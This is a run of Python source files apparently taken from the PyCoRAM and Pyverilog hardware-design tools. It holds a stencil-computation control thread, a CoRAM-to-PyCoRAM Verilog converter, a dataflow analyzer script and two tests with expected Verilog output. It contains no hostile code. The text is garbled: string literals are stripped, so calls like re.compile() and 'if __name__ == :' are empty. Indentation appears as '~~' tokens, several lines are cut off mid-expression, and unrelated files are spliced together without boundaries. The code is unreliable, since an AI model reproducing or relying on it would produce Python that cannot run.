mem1 . write ( 0 , read_addr , mesh_size ) \n 
read_addr += mesh_size * DSIZE \n 
\n 
mem2 . write ( 0 , read_addr , mesh_size ) \n 
read_addr += mesh_size * DSIZE \n 
\n 
write_addr = write_start + mesh_size * DSIZE + DSIZE \n 
\n 
for i in range ( mesh_size - 2 ) : \n 
~~~ hot_spot = 1 if i == 0 else 0 \n 
pos = hot_spot \n 
\n 
mem0 . wait ( ) \n 
mem1 . wait ( ) \n 
mem2 . wait ( ) \n 
\n 
channel . write ( pos ) \n 
channel . read ( ) \n 
\n 
if read_page == 0 : \n 
~~~ mem0 . write_nonblocking ( 0 , read_addr , mesh_size ) \n 
~~ elif read_page == 1 : \n 
~~~ mem1 . write_nonblocking ( 0 , read_addr , mesh_size ) \n 
~~ elif read_page == 2 : \n 
~~~ mem2 . write_nonblocking ( 0 , read_addr , mesh_size ) \n 
\n 
~~ read_page = 0 if read_page == 2 else read_page + 1 \n 
read_addr += mesh_size * DSIZE \n 
\n 
mem_d0 . read_nonblocking ( 1 , write_addr , mesh_size - 2 ) \n 
write_addr += mesh_size * DSIZE \n 
mem_d0 . wait ( ) \n 
\n 
#------------------------------------------------------------------------------- \n 
~~ ~~ def st_computation ( num_iter , mesh_size ) : \n 
~~~ for i in range ( num_iter / 2 ) : \n 
~~~ st_step ( mesh_size , a_offset , b_offset ) \n 
st_step ( mesh_size , b_offset , a_offset ) \n 
\n 
#------------------------------------------------------------------------------- \n 
~~ ~~ def st_sum ( mesh_size ) : \n 
~~~ check_sum = 0 \n 
read_addr = a_offset \n 
for i in range ( mesh_size ) : \n 
~~~ mem0 . write ( 0 , read_addr , mesh_size ) \n 
init_sum = 1 if i == 0 else 0 \n 
calc_sum = 1 \n 
pos = ( init_sum << 2 ) | ( calc_sum << 1 ) \n 
channel . write ( pos ) \n 
read_addr += mesh_size * DSIZE \n 
check_sum = channel . read ( ) \n 
~~ channel . write ( 0xff ) # reset main pipeline \n 
return check_sum \n 
\n 
#------------------------------------------------------------------------------- \n 
~~ def st_main ( ) : \n 
~~~ global a_offset \n 
global b_offset \n 
\n 
mesh_size = iochannel . read ( ) \n 
print ( "thread: mesh_size=%d" % mesh_size ) \n 
num_iter = iochannel . read ( ) \n 
print ( "thread: num_iter=%d" % num_iter ) \n 
a_offset = iochannel . read ( ) \n 
print ( "thread: a_offset=%d" % a_offset ) \n 
b_offset = iochannel . read ( ) \n 
print ( "thread: b_offset=%d" % b_offset ) \n 
\n 
print ( "thread: st_set_mesh_size" ) \n 
st_set_mesh_size ( mesh_size ) \n 
\n 
print ( "thread: st_computation" ) \n 
st_computation ( num_iter , mesh_size ) \n 
\n 
print ( "thread: st_sum" ) \n 
check_sum = st_sum ( mesh_size ) \n 
\n 
iochannel . write ( check_sum ) \n 
\n 
#------------------------------------------------------------------------------- \n 
~~ while True : \n 
~~~ st_main ( ) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import re \n 
import sys \n 
import os \n 
\n 
#------------------------------------------------------------------------------- \n 
# EDIT! getRamName is a conversion rule of SUB_ID  \n 
#------------------------------------------------------------------------------- \n 
def getRamId ( oid , sid ) : \n 
~~~ if 0 <= sid and sid <= 31 : \n 
~~~ return 0 \n 
~~ if 32 <= sid and sid <= 63 : \n 
~~~ return 1 \n 
~~ if 64 <= sid and sid <= 95 : \n 
~~~ return 2 \n 
~~ if 96 <= sid and sid <= 127 : \n 
~~~ return 3 \n 
\n 
~~ ~~ def getRamSubId ( oid , sid ) : \n 
~~~ if 0 <= sid and sid <= 31 : \n 
~~~ return sid \n 
~~ if 32 <= sid and sid <= 63 : \n 
~~~ return sid - 32 \n 
~~ if 64 <= sid and sid <= 95 : \n 
~~~ return sid - 64 \n 
~~ if 96 <= sid and sid <= 127 : \n 
~~~ return sid - 96 \n 
\n 
#------------------------------------------------------------------------------- \n 
# EDIT! getChannelName is a conversion rule of SUB_ID  \n 
#------------------------------------------------------------------------------- \n 
~~ ~~ def getChannelId ( oid , sid ) : \n 
~~~ return oid \n 
\n 
~~ def getChannelSubId ( oid , sid ) : \n 
~~~ return sid \n 
\n 
#------------------------------------------------------------------------------- \n 
# EDIT! getRegisterName is a conversion rule of SUB_ID  \n 
#------------------------------------------------------------------------------- \n 
~~ def getRegisterId ( oid , sid ) : \n 
~~~ return oid \n 
\n 
~~ def getRegisterSubId ( oid , sid ) : \n 
~~~ return sid \n 
\n 
#------------------------------------------------------------------------------- \n 
~~ def main ( ) : \n 
~~~ f = open ( sys . argv [ 1 ] , ) \n 
lines = f . readlines ( ) \n 
output = [ ] \n 
\n 
p_thread = re . compile ( ) \n 
p_thread_id = re . compile ( ) \n 
p_object_id = re . compile ( ) \n 
p_width = re . compile ( ) \n 
p_depth = re . compile ( ) \n 
p_indexwidth = re . compile ( ) \n 
p_logdepth = re . compile ( ) \n 
p_sub_id = re . compile ( ) \n 
\n 
module_name = None \n 
thread_name = None \n 
thread_id = None \n 
object_id = None \n 
sub_id = None \n 
width = None \n 
indexwidth = None \n 
depth = None \n 
\n 
mode = False \n 
\n 
sub_id_num = None \n 
sub_id_base = None \n 
\n 
buffer = [ ] \n 
\n 
print ( "`include \\"coram2pycoram.v\\"" ) \n 
\n 
for line in lines : \n 
~~~ if not mode : \n 
~~~ m = p_thread . match ( line ) \n 
if m : \n 
~~~ thread_name = re . match ( \'.*(".*").*\' , m . group ( 2 ) ) . group ( 1 ) \n 
module_name = re . search ( , line ) . group ( 1 ) \n 
mode = True \n 
buffer = [ ] \n 
buffer . append ( line ) \n 
continue \n 
~~ ~~ else : \n 
~~~ m = p_thread_id . match ( line ) \n 
if m : \n 
~~~ tid_str = m . group ( 2 ) [ 1 : - 1 ] \n 
thread_id = re . match ( , tid_str ) . group ( 2 ) \n 
#tid_str = m.group(2) \n 
\n 
buffer . append ( line ) \n 
continue \n 
~~ m = p_object_id . match ( line ) \n 
if m : \n 
~~~ oid_str = m . group ( 2 ) [ 1 : - 1 ] \n 
object_id = re . match ( , oid_str ) . group ( 2 ) \n 
#oid_str = m.group(2) \n 
\n 
buffer . append ( line ) \n 
continue \n 
~~ m = p_width . match ( line ) \n 
if m : \n 
#width_str = m.group(2)[1:-1] \n 
\n 
~~~ width_str = m . group ( 2 ) \n 
width = re . match ( , width_str ) . group ( 1 ) \n 
buffer . append ( line ) \n 
continue \n 
~~ m = p_depth . match ( line ) \n 
if m : \n 
#depth_str = m.group(2)[1:-1] \n 
\n 
~~~ depth_str = m . group ( 2 ) \n 
depth = re . match ( , depth_str ) . group ( 1 ) \n 
buffer . append ( line ) \n 
continue \n 
~~ m = p_indexwidth . match ( line ) \n 
if m : \n 
#indexwidth_str = m.group(2)[1:-1] \n 
\n 
~~~ indexwidth_str = m . group ( 2 ) \n 
indexwidth = re . match ( , indexwidth_str ) . group ( 1 ) \n 
buffer . append ( line ) \n 
continue \n 
~~ m = p_logdepth . match ( line ) \n 
if m : \n 
#logdepth_str = m.group(2)[1:-1] \n 
\n 
~~~ logdepth_str = m . group ( 2 ) \n 
logdepth = re . match ( , logdepth_str ) . group ( 1 ) \n 
buffer . append ( line ) \n 
continue \n 
~~ m = p_sub_id . match ( line ) \n 
if m : \n 
#sid_str = m.group(2)[1:-1] \n 
\n 
#sid_str = m.group(2) \n 
\n 
~~~ sid_str = m . group ( 2 ) \n 
\n 
sub_id_m = re . search ( , sid_str ) \n 
sub_id = sub_id_m . group ( 0 ) \n 
sub_id_num = sub_id_m . group ( 2 ) \n 
sub_id_base = ( 10 if sub_id_m . group ( 1 ) . count ( "\'d" ) > 0 else \n 
16 if sub_id_m . group ( 1 ) . count ( "\'h" ) > 0 else \n 
2 if sub_id_m . group ( 1 ) . count ( "\'b" ) > 0 else \n 
10 ) \n 
buffer . append ( line ) \n 
continue \n 
\n 
~~ ~~ if mode : \n 
~~~ print ( "PY%s #(" % module_name ) \n 
\n 
print ( "/*CORAM_THREAD_NAME*/ %s," % . join ( ( thread_name [ : - 1 ] , , thread_id , \'"\' ) ) ) \n 
print ( "/*CORAM_THREAD_ID*/ %s," % thread_id ) \n 
\n 
if module_name . count ( ) > 0 : \n 
~~~ print ( "/*CORAM_ID*/ %d," % getRamId ( int ( object_id ) , int ( sub_id_num , sub_id_base ) ) ) \n 
~~ if module_name . count ( ) > 0 : \n 
~~~ print ( "/*CORAM_ID*/ %d," % getChannelId ( int ( object_id ) , int ( sub_id_num , sub_id_base ) ~~ if module_name . count ( ) > 0 : \n 
~~~ print ( "/*CORAM_ID*/ %d," % getRegisterId ( int ( object_id ) , int ( sub_id_num , sub_id_base \n 
~~ if module_name . count ( ) > 0 : \n 
~~~ print ( "/*CORAM_SUB_ID*/ %s," % getRamSubId ( int ( object_id ) , int ( sub_id_num , sub_id_base ~~ if module_name . count ( ) > 0 : \n 
#print("/*CORAM_SUB_ID*/ %s," % getChannelSubId(int(object_id), int(sub_id_num, sub_id_base))) ~~~ print ( "/*CORAM_SUB_ID*/ %s," % ) \n 
~~ if module_name . count ( ) > 0 : \n 
#print("/*CORAM_SUB_ID*/ %s," % getRegisterSubId(int(object_id), int(sub_id_num, sub_id_base))) ~~~ print ( "/*CORAM_SUB_ID*/ %s," % ) \n 
\n 
~~ print ( "/*CORAM_ADDR_LEN*/ %s," % indexwidth ) \n 
print ( "/*CORAM_DATA_WIDTH*/ %s," % width ) \n 
print ( "/*THREAD*/ %s," % thread_name ) \n 
print ( . join ( buffer [ 1 : ] ) ) \n 
\n 
~~ mode = False \n 
print ( line , end = ) \n 
\n 
#------------------------------------------------------------------------------- \n 
~~ ~~ main ( ) \n 
from __future__ import absolute_import \n 
from __future__ import print_function \n 
import sys \n 
import os \n 
from optparse import OptionParser \n 
\n 
# the next line can be removed after installation \n 
sys . path . insert ( 0 , os . path . dirname ( os . path . dirname ( os . path . abspath ( __file__ ) ) ) ) \n 
\n 
import pyverilog . utils . version \n 
from pyverilog . dataflow . dataflow_analyzer import VerilogDataflowAnalyzer \n 
\n 
def main ( ) : \n 
~~~ INFO = "Verilog module signal/module dataflow analyzer" \n 
VERSION = pyverilog . utils . version . VERSION \n 
USAGE = "Usage: python example_dataflow_analyzer.py -t TOPMODULE file ..." \n 
\n 
def showVersion ( ) : \n 
~~~ print ( INFO ) \n 
print ( VERSION ) \n 
print ( USAGE ) \n 
sys . exit ( ) \n 
\n 
~~ optparser = OptionParser ( ) \n 
optparser . add_option ( "-v" , "--version" , action = "store_true" , dest = "showversion" , \n 
default = False , help = "Show the version" ) \n 
optparser . add_option ( "-I" , "--include" , dest = "include" , action = "append" , \n 
default = [ ] , help = "Include path" ) \n 
optparser . add_option ( "-D" , dest = "define" , action = "append" , \n 
default = [ ] , help = "Macro Definition" ) \n 
optparser . add_option ( "-t" , "--top" , dest = "topmodule" , \n 
default = "TOP" , help = "Top module, Default=TOP" ) \n 
optparser . add_option ( "--nobind" , action = "store_true" , dest = "nobind" , \n 
default = False , help = "No binding traversal, Default=False" ) \n 
optparser . add_option ( "--noreorder" , action = "store_true" , dest = "noreorder" , \n 
default = False , help = "No reordering of binding dataflow, Default=False" ) \n 
( options , args ) = optparser . parse_args ( ) \n 
\n 
filelist = args \n 
if options . showversion : \n 
~~~ showVersion ( ) \n 
\n 
~~ for f in filelist : \n 
~~~ if not os . path . exists ( f ) : raise IOError ( "file not found: " + f ) \n 
\n 
~~ if len ( filelist ) == 0 : \n 
~~~ showVersion ( ) \n 
\n 
~~ analyzer = VerilogDataflowAnalyzer ( filelist , options . topmodule , \n 
noreorder = options . noreorder , \n 
nobind = options . nobind , \n 
preprocess_include = options . include , \n 
preprocess_define = options . define ) \n 
analyzer . generate ( ) \n 
\n 
directives = analyzer . get_directives ( ) \n 
print ( ) \n 
for dr in sorted ( directives , key = lambda x : str ( x ) ) : \n 
~~~ print ( dr ) \n 
\n 
~~ instances = analyzer . getInstances ( ) \n 
print ( ) \n 
for module , instname in sorted ( instances , key = lambda x : str ( x [ 1 ] ) ) : \n 
~~~ print ( ( module , instname ) ) \n 
\n 
~~ if options . nobind : \n 
~~~ print ( ) \n 
signals = analyzer . getSignals ( ) \n 
for sig in signals : \n 
~~~ print ( sig ) \n 
\n 
~~ print ( ) \n 
consts = analyzer . getConsts ( ) \n 
for con in consts : \n 
~~~ print ( con ) \n 
\n 
~~ ~~ else : \n 
~~~ terms = analyzer . getTerms ( ) \n 
print ( ) \n 
for tk , tv in sorted ( terms . items ( ) , key = lambda x : str ( x [ 0 ] ) ) : \n 
~~~ print ( tv . tostr ( ) ) \n 
\n 
~~ binddict = analyzer . getBinddict ( ) \n 
print ( ) \n 
for bk , bv in sorted ( binddict . items ( ) , key = lambda x : str ( x [ 0 ] ) ) : \n 
~~~ for bvi in bv : \n 
~~~ print ( bvi . tostr ( ) ) \n 
\n 
~~ ~~ ~~ ~~ if __name__ == : \n 
~~~ main ( ) \n 
#------------------------------------------------------------------------------- \n 
# replace.py \n 
#  \n 
# Replacing DFUndefined and None with DFTerminal \n 
# \n 
# Copyright (C) 2013, Shinya Takamaeda-Yamazaki \n 
# License: Apache 2.0 \n 
#------------------------------------------------------------------------------- \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import sys \n 
import os \n 
\n 
from pyverilog . dataflow . dataflow import * \n 
\n 
def replaceUndefined ( tree , termname ) : \n 
~~~ if tree is None : return DFTerminal ( termname ) \n 
if isinstance ( tree , DFUndefined ) : return DFTerminal ( termname ) \n 
#if isinstance(tree, DFHighImpedance): return DFTerminal(termname) \n 
if isinstance ( tree , DFConstant ) : return tree \n 
if isinstance ( tree , DFEvalValue ) : return tree \n 
if isinstance ( tree , DFTerminal ) : return tree \n 
if isinstance ( tree , DFBranch ) : \n 
~~~ condnode = replaceUndefined ( tree . condnode , termname ) \n 
truenode = replaceUndefined ( tree . truenode , termname ) \n 
falsenode = replaceUndefined ( tree . falsenode , termname ) \n 
return DFBranch ( condnode , truenode , falsenode ) \n 
~~ if isinstance ( tree , DFOperator ) : \n 
~~~ nextnodes = [ ] \n 
for n in tree . nextnodes : \n 
~~~ nextnodes . append ( replaceUndefined ( n , termname ) ) \n 
~~ return DFOperator ( tuple ( nextnodes ) , tree . operator ) \n 
~~ if isinstance ( tree , DFPartselect ) : \n 
~~~ msb = replaceUndefined ( tree . msb , termname ) \n 
lsb = replaceUndefined ( tree . lsb , termname ) \n 
var = replaceUndefined ( tree . var , termname ) \n 
return DFPartselect ( var , msb , lsb ) \n 
~~ if isinstance ( tree , DFPointer ) : \n 
~~~ ptr = replaceUndefined ( tree . ptr , termname ) \n 
var = replaceUndefined ( tree . var , termname ) \n 
return DFPointer ( var , ptr ) \n 
~~ if isinstance ( tree , DFConcat ) : \n 
~~~ nextnodes = [ ] \n 
for n in tree . nextnodes : \n 
~~~ nextnodes . append ( replaceUndefined ( n , termname ) ) \n 
~~ return DFConcat ( tuple ( nextnodes ) ) \n 
~~ raise DefinitionError ( % ( str ( type ( tree ) ) , str ( tree ) ) ) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import os \n 
import sys \n 
from pyverilog . dataflow . dataflow_analyzer import VerilogDataflowAnalyzer \n 
from pyverilog . dataflow . optimizer import VerilogDataflowOptimizer \n 
from pyverilog . controlflow . controlflow_analyzer import VerilogControlflowAnalyzer \n 
\n 
codedir = os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . abspath ( __file__ ) ) ) ) + \n 
expected = """\\\nTOP.IN1: TOP_IN1\nTOP.SEL: TOP_SEL\nTOP.bit: (((TOP_SEL==\'d0))? TOP_IN1 : 1\'d0)\nTOP.md_always0.al_block0.al_functioncall0._rn0_func1: TOP_IN1\nTOP.md_always0.al_block0.al_functioncall0._rn1_func1: 1\'d0\nTOP.md_always0.al_block0.al_functioncall0.func1: (((TOP_SEL==\'d0))? TOP_IN1 : 1\'d0)\nTOP.md_always0.al_block0.al_functioncall0.in1: TOP_IN1\nTOP.md_always0.al_block0.al_functioncall0.sel: TOP_SEL\n""" \n 
\n 
def test ( ) : \n 
~~~ filelist = [ codedir + ] \n 
topmodule = \n 
noreorder = False \n 
nobind = False \n 
include = None \n 
define = None \n 
\n 
analyzer = VerilogDataflowAnalyzer ( filelist , topmodule , \n 
noreorder = noreorder , \n 
nobind = nobind , \n 
preprocess_include = include , \n 
preprocess_define = define ) \n 
analyzer . generate ( ) \n 
\n 
directives = analyzer . get_directives ( ) \n 
instances = analyzer . getInstances ( ) \n 
terms = analyzer . getTerms ( ) \n 
binddict = analyzer . getBinddict ( ) \n 
\n 
optimizer = VerilogDataflowOptimizer ( terms , binddict ) \n 
optimizer . resolveConstant ( ) \n 
\n 
c_analyzer = VerilogControlflowAnalyzer ( topmodule , terms , \n 
binddict , \n 
resolved_terms = optimizer . getResolvedTerms ( ) , \n 
resolved_binddict = optimizer . getResolvedBinddict ( ) , \n 
constlist = optimizer . getConstlist ( ) \n 
) \n 
\n 
output = [ ] \n 
for tk in sorted ( c_analyzer . resolved_terms . keys ( ) , key = lambda x : str ( x ) ) : \n 
~~~ tree = c_analyzer . makeTree ( tk ) \n 
output . append ( str ( tk ) + + tree . tocode ( ) ) \n 
\n 
~~ rslt = . join ( output ) + \n 
\n 
print ( rslt ) \n 
\n 
assert ( expected == rslt ) \n 
\n 
~~ if __name__ == : \n 
~~~ test ( ) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import dataflow_example \n 
\n 
expected_verilog = """\nmodule test;\n\n  reg CLK;\n  reg RST;\n  reg [32-1:0] xdata;\n  reg xvalid;\n  wire xready;\n  reg [32-1:0] ydata;\n  reg yvalid;\n  wire yready;\n  wire [32-1:0] zdata;\n  wire zvalid;\n  reg zready;\n\n  main\n  uut\n  (\n    .CLK(CLK),\n    .RST(RST),\n    .xdata(xdata),\n    .xvalid(xvalid),\n    .xready(xready),\n    .ydata(ydata),\n    .yvalid(yvalid),\n    .yready(yready),\n    .zdata(zdata),\n    .zvalid(zvalid),\n    .zready(zready)\n  );\n\n  reg reset_done;\n\n  initial begin\n    $dumpfile("uut.vcd");\n    $dumpvars(0, uut);\n  end\n\n\n  initial begin\n    CLK = 0;\n    forever begin\n      #5 CLK = !CLK;\n    end\n  end\n\n\n  initial begin\n    RST = 0;\n    reset_done = 0;\n    xdata = 0;\n    xvalid = 0;\n    ydata = 0;\n    yvalid = 0;\n    zready = 0;\n    #100;\n    RST = 1;\n    #100;\n    RST = 0;\n    #1000;\n    reset_done = 1;\n    @(posedge CLK);\n    #1;\n    #10000;\n    $finish;\n  end\n\n  reg [32-1:0] xfsm;\n  localparam xfsm_init = 0;\n  reg [32-1:0] _tmp_0;\n  localparam xfsm_1 = 1;\n  localparam xfsm_2 = 2;\n  localparam xfsm_3 = 3;\n  localparam xfsm_4 = 4;\n  localparam xfsm_5 = 5;\n  localparam xfsm_6 = 6;\n  localparam xfsm_7 = 7;\n  localparam xfsm_8 = 8;\n  localparam xfsm_9 = 9;\n  localparam xfsm_10 = 10;\n  localparam xfsm_11 = 11;\n  localparam xfsm_12 = 12;\n  localparam xfsm_13 = 13;\n  localparam xfsm_14 = 14;\n  localparam xfsm_15 = 15;\n  localparam xfsm_16 = 16;\n  localparam xfsm_17 = 17;\n  localparam xfsm_18 = 18;\n  localparam xfsm_19 = 19;\n  localparam xfsm_20 = 20;\n  localparam xfsm_21 = 21;\n  localparam xfsm_22 = 22;\n  localparam xfsm_23 = 23;\n  localparam xfsm_24 = 24;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      xfsm <= xfsm_init;\n      _tmp_0 <= 0;\n    end else begin\n      case(xfsm)\n        xfsm_init: begin\n          xvalid <= 0;\n          if(reset_done) begin\n            xfsm <= xfsm_1;\n          end \n        end\n        xfsm_1: begin\n          xfsm <= xfsm_2;\n        end\n        xfsm_2: begin\n          xfsm <= xfsm_3;\n        end\n        xfsm_3: begin\n          xfsm <= xfsm_4;\n        end\n        xfsm_4: begin\n          xfsm <= xfsm_5;\n        end\n        xfsm_5: begin\n          xfsm <= xfsm_6;\n        end\n        xfsm_6: begin\n          xfsm <= xfsm_7;\n        end\n        xfsm_7: begin\n          xfsm <= xfsm_8;\n        end\n        xfsm_8: begin\n          xfsm <= xfsm_9;\n        end\n        xfsm_9: begin\n          xfsm <= xfsm_10;\n        end\n        xfsm_10: begin\n          xfsm <= xfsm_11;\n        end\n        xfsm_11: begin\n          xvalid <= 1;\n          xfsm <= xfsm_12;\n        end\n        xfsm_12: begin\n          if(xready) begin\n            xdata <= xdata + 1;\n          end \n          if(xready) begin\n            _tmp_0 <= _tmp_0 + 1;\n          end \n          if((_tmp_0 == 5) && xready) begin\n            xfsm <= xfsm_13;\n          end \n        end\n        xfsm_13: begin\n          xvalid <= 0;\n          xfsm <= xfsm_14;\n        end\n        xfsm_14: begin\n          xfsm <= xfsm_15;\n        end\n        xfsm_15: begin\n          xfsm <= xfsm_16;\n        end\n        xfsm_16: begin\n          xfsm <= xfsm_17;\n        end\n        xfsm_17: begin\n          xfsm <= xfsm_18;\n        end\n        xfsm_18: begin\n          xfsm <= xfsm_19;\n        end\n        xfsm_19: begin\n          xfsm <= xfsm_20;\n        end\n        xfsm_20: begin\n          xfsm <= xfsm_21;\n        end\n        xfsm_21: begin\n          xfsm <= xfsm_22;\n        end\n        xfsm_22: begin\n          xfsm <= xfsm_23;\n        end\n        xfsm_23: begin\n          xvalid <= 1;\n          if(xready) begin\n            xdata <= xdata + 1;\n          end \n          if(xready) begin\n            _tmp_0 <= _tmp_0 + 1;\n          end \n          if((_tmp_0 == 10) && xready) begin\n            xfsm <= xfsm_24;\n          end \n        end\n        xfsm_24: begin\n          xvalid <= 0;\n        end\n      endcase\n    end\n  end\n\n  reg [32-1:0] yfsm;\n  localparam yfsm_init = 0;\n  reg [32-1:0] _tmp_1;\n  localparam yfsm_1 = 1;\n  localparam yfsm_2 = 2;\n  localparam yfsm_3 = 3;\n  localparam yfsm_4 = 4;\n  localparam yfsm_5 = 5;\n  localparam yfsm_6 = 6;\n  localparam yfsm_7 = 7;\n  localparam yfsm_8 = 8;\n  localparam yfsm_9 = 9;\n  localparam yfsm_10 = 10;\n  localparam yfsm_11 = 11;\n  localparam yfsm_12 = 12;\n  localparam yfsm_13 = 13;\n  localparam yfsm_14 = 14;\n  localparam yfsm_15 = 15;\n  localparam yfsm_16 = 16;\n  localparam yfsm_17 = 17;\n  localparam yfsm_18 = 18;\n  localparam yfsm_19 = 19;\n  localparam yfsm_20 = 20;\n  localparam yfsm_21 = 21;\n  localparam yfsm_22 = 22;\n  localparam yfsm_23 = 23;\n  localparam yfsm_24 = 24;\n  localparam yfsm_25 = 25;\n  localparam yfsm_26 = 26;\n  localparam yfsm_27 = 27;\n  localparam yfsm_28 = 28;\n  localparam yfsm_29 = 29;\n  localparam yfsm_30 = 30;\n  localparam yfsm_31 = 31;\n  localparam yfsm_32 = 32;\n  localparam yfsm_33 = 33;\n  localparam yfsm_34 = 34;\n  localparam yfsm_35 = 35;\n  localparam yfsm_36 = 36;\n  localparam yfsm_37 = 37;\n  localparam yfsm_38 = 38;\n  localparam yfsm_39 = 39;\n  localparam yfsm_40 = 40;\n  localparam yfsm_41 = 41;\n  localparam yfsm_42 = 42;\n  localparam yfsm_43 = 43;\n  localparam yfsm_44 = 44;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      yfsm <= yfsm_init;\n      _tmp_1 <= 0;\n    end else begin\n      case(yfsm)\n        yfsm_init: begin\n          yvalid <= 0;\n          if(reset_done) begin\n            yfsm <= yfsm_1;\n          end \n        end\n        yfsm_1: begin\n          yfsm <= yfsm_2;\n        end\n        yfsm_2: begin\n          yfsm <= yfsm_3;\n        end\n        yfsm_3: begin\n          yfsm <= yfsm_4;\n        end\n        yfsm_4: begin\n          yfsm <= yfsm_5;\n        end\n        yfsm_5: begin\n          yfsm <= yfsm_6;\n        end\n        yfsm_6: begin\n          yfsm <= yfsm_7;\n        end\n        yfsm_7: begin\n          yfsm <= yfsm_8;\n        end\n        yfsm_8: begin\n          yfsm <= yfsm_9;\n        end\n        yfsm_9: begin\n          yfsm <= yfsm_10;\n        end\n        yfsm_10: begin\n          yfsm <= yfsm_11;\n        end\n        yfsm_11: begin\n          yfsm <= yfsm_12;\n        end\n        yfsm_12: begin\n          yfsm <= yfsm_13;\n        end\n        yfsm_13: begin\n          yfsm <= yfsm_14;\n        end\n        yfsm_14: begin\n          yfsm <= yfsm_15;\n        end\n        yfsm_15: begin\n          yfsm <= yfsm_16;\n        end\n        yfsm_16: begin\n          yfsm <= yfsm_17;\n        end\n        yfsm_17: begin\n          yfsm <= yfsm_18;\n        end\n        yfsm_18: begin\n          yfsm <= yfsm_19;\n        end\n        yfsm_19: begin\n          yfsm <= yfsm_20;\n        end\n        yfsm_20: begin\n          yfsm <= yfsm_21;\n        end\n        yfsm_21: begin\n          yvalid <= 1;\n          yfsm <= yfsm_22;\n        end\n        yfsm_22: begin\n          if(yready) begin\n            ydata <= ydata + 2;\n          end \n          if(yready) begin\n            _tmp_1 <= _tmp_1 + 1;\n          end \n          if((_tmp_1 == 5) && yready) begin\n            yfsm <= yfsm_23;\n          end \n        end\n        yfsm_23: begin\n          yvalid <= 0;\n          yfsm <= yfsm_24;\n        end\n        yfsm_24: begin\n          yfsm <= yfsm_25;\n        end\n        yfsm_25: begin\n          yfsm <= yfsm_26;\n        end\n        yfsm_26: begin\n          yfsm <= yfsm_27;\n        end\n        yfsm_27: begin\n          yfsm <= yfsm_28;\n        end\n        yfsm_28: begin\n          yfsm <= yfsm_29;\n        end\n        yfsm_29: begin\n          yfsm <= yfsm_30;\n        end\n        yfsm_30: begin\n          yfsm <= yfsm_31;\n        end\n        yfsm_31: begin\n          yfsm <= yfsm_32;\n        end\n        yfsm_32: begin\n          yfsm <= yfsm_33;\n        end\n        yfsm_33: begin\n          yfsm <= yfsm_34;\n        end\n        yfsm_34: begin\n          yfsm <= yfsm_35;\n        end\n        yfsm_35: begin\n          yfsm <= yfsm_36;\n        end\n        yfsm_36: begin\n          yfsm <= yfsm_37;\n        end\n        yfsm_37: begin\n          yfsm <= yfsm_38;\n        end\n        yfsm_38: begin\n          yfsm <= yfsm_39;\n        end\n        yfsm_39: begin\n          yfsm <= yfsm_40;\n        end\n        yfsm_40: begin\n          yfsm <= yfsm_41;\n        end\n        yfsm_41: begin\n          yfsm <= yfsm_42;\n        end\n        yfsm_42: begin\n          yfsm <= yfsm_43;\n        end\n        yfsm_43: begin\n          yvalid <= 1;\n          if(yready) begin\n            ydata <= ydata + 2;\n          end \n          if(yready) begin\n            _tmp_1 <= _tmp_1 + 1;\n          end \n          if((_tmp_1 == 10) && yready) begin\n            yfsm <= yfsm_44;\n          end \n        end\n        yfsm_44: begin\n          yvalid <= 0;\n        end\n      endcase\n    end\n  end\n\n  reg [32-1:0] zfsm;\n  localparam zfsm_init = 0;\n  localparam zfsm_1 = 1;\n  localparam zfsm_2 = 2;\n  localparam zfsm_3 = 3;\n  localparam zfsm_4 = 4;\n  localparam zfsm_5 = 5;\n  localparam zfsm_6 = 6;\n  localparam zfsm_7 = 7;\n  localparam zfsm_8 = 8;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      zfsm <= zfsm_init;\n    end else begin\n      case(zfsm)\n        zfsm_init: begin\n          zready <= 0;\n          if(reset_done) begin\n            zfsm <= zfsm_1;\n          end \n        end\n        zfsm_1: begin\n          zfsm <= zfsm_2;\n        end\n        zfsm_2: begin\n          if(zvalid) begin\n            zready <= 1;\n          end \n          if(zvalid) begin\n            zfsm <= zfsm_3;\n          end \n        end\n        zfsm_3: begin\n          zready <= 0;\n          zfsm <= zfsm_4;\n        end\n        zfsm_4: begin\n          zready <= 0;\n          zfsm <= zfsm_5;\n        end\n        zfsm_5: begin\n          zready <= 0;\n          zfsm <= zfsm_6;\n        end\n        zfsm_6: begin\n          zready <= 0;\n          zfsm <= zfsm_7;\n        end\n        zfsm_7: begin\n          zready <= 0;\n          zfsm <= zfsm_8;\n        end\n        zfsm_8: begin\n          zfsm <= zfsm_2;\n        end\n      endcase\n    end\n  end\n\n\n  always @(posedge CLK) begin\n    if(reset_done) begin\n      if(xvalid && xready) begin\n        $display("xdata=%d", xdata);\n      end \n      if(yvalid && yready) begin\n        $display("ydata=%d", ydata);\n      end \n      if(zvalid && zready) begin\n        $display("zdata=%d", zdata);\n      end \n    end \n  end\n\n\nendmodule\n\n\n\nmodule main\n(\n  input CLK,\n  input RST,\n  input [32-1:0] xdata,\n  input xvalid,\n  output xready,\n  input [32-1:0] ydata,\n  input yvalid,\n  output yready,\n  output [32-1:0] zdata,\n  output zvalid,\n  input zready\n);\n\n  reg [32-1:0] _tmp_data_0;\n  reg _tmp_valid_0;\n  wire _tmp_ready_0;\n  assign xready = (_tmp_ready_0 || !_tmp_valid_0) && (xvalid && yvalid);\n  assign yready = (_tmp_ready_0 || !_tmp_valid_0) && (xvalid && yvalid);\n  assign zdata = _tmp_data_0;\n  assign zvalid = _tmp_valid_0;\n  assign _tmp_ready_0 = zready;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      _tmp_data_0 <= 0;\n      _tmp_valid_0 <= 0;\n    end else begin\n      if((_tmp_ready_0 || !_tmp_valid_0) && (xready && yready) && (xvalid && yvalid)) begin\n        _tmp_data_0 <= xdata + ydata;\n      end \n      if(_tmp_valid_0 && _tmp_ready_0) begin\n        _tmp_valid_0 <= 0;\n      end \n      if((_tmp_ready_0 || !_tmp_valid_0) && (xready && yready)) begin\n        _tmp_valid_0 <= xvalid && yvalid;\n      end \n    end\n  end\n\n\nendmodule\n""" \n 
\n 
def test ( ) : \n 
~~~ test_module = dataflow_example . mkTest ( ) \n 
code = test_module . to_verilog ( ) \n 
\n 
from pyverilog . vparser . parser import VerilogParser \n 
